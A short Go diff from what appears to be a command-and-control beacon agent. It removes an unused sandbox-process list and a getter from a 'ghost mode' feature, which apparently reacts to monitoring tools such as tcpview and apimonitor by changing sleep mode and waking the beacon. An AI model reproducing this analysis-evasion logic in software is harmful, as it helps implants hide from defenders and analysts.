@@ -32,7 +32,6 @@ var (
 		"apimonitor", "apilogger", "deviare",
 		"tcpview", "tcpview64",
 	}
-	sandboxProcesses []string
 )
 
 func isInGhostMode() bool {
@@ -92,10 +91,6 @@ func exitGhostMode() {
 	ghostTrigger = ""
 	setSleepMode(SleepModeDefault)
 	requestBeaconWake()
-}
-
-func getGhostModeReason() string {
-	return ghostTrigger
 }
 
 func handleGhostModeStatus(task Task, res *TaskResult) {
